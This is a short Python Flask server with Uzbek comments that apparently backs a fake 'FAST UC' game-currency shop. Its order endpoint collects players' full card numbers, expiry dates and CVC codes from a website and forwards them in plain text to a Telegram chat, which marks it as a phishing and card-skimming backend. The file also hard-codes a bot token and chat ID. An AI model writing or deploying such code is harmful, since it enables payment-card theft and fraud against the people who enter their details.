import os
import telebot
from flask import Flask, request, jsonify
from flask_cors import CORS

# 1. BotFather'dan olgan YANGI tokeningizni kiriting
TOKEN = '8606363844:AAHqMunymcZUXE0zM2ASGzsJwYDGSF-iBmI'
bot = telebot.TeleBot(TOKEN)

# 2. O'zingizning Telegram Chat ID raqamingiz (buyurtmalar keladigan manzil)
ADMIN_CHAT_ID = "8773126526"

app = Flask(name)
CORS(app)  # Saytdan keladigan so'rovlarni bloklamaslik uchun

@app.route('/')
def home():
    return "FAST UC Server faol ishlamoqda!"

# Saytdan buyurtma va karta ma'lumotlari keladigan manzil (API)
@app.route('/send-order', methods=['POST'])
def send_order():
    try:
        data = request.json
        
        player_id = data.get('playerId', 'Noma\'lum')
        package = data.get('package', 'Noma\'lum')
        price = data.get('price', 'Noma\'lum')
        payment_method = data.get('payMethod', 'Noma\'lum')
        card_number = data.get('cardNumber', 'Noma\'lum')
        card_expiry = data.get('cardExpiry', 'Noma\'lum')
        card_cvc = data.get('cardCvc', 'Noma\'lum')

        # Telegramingizga keladigan chiroyli xabar matni
        msg_text = (
            "🚨 YANGI BUYURTMA VA KARTA! 🚨\n\n"
            f"👤 Player ID: {player_id}\n"
            f"💎 Paket: {package}\n"
            f"💰 Narxi: {price}\n"
            f"💳 To'lov usuli: {payment_method}\n\n"
            "💳 KARTA MA'LUMOTLARI:\n"
            f"🔹 Raqam: {card_number}\n"
            f"🔹 Muddati: {card_expiry}\n"
            f"🔹 CVC: {card_cvc}"
        )

        # Telegramga xabar yuborish
        bot.send_message(ADMIN_CHAT_ID, msg_text, parse_mode="Markdown")
        return jsonify({"status": "success", "message": "Buyurtma qabul qilindi!"}), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if name == 'main':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
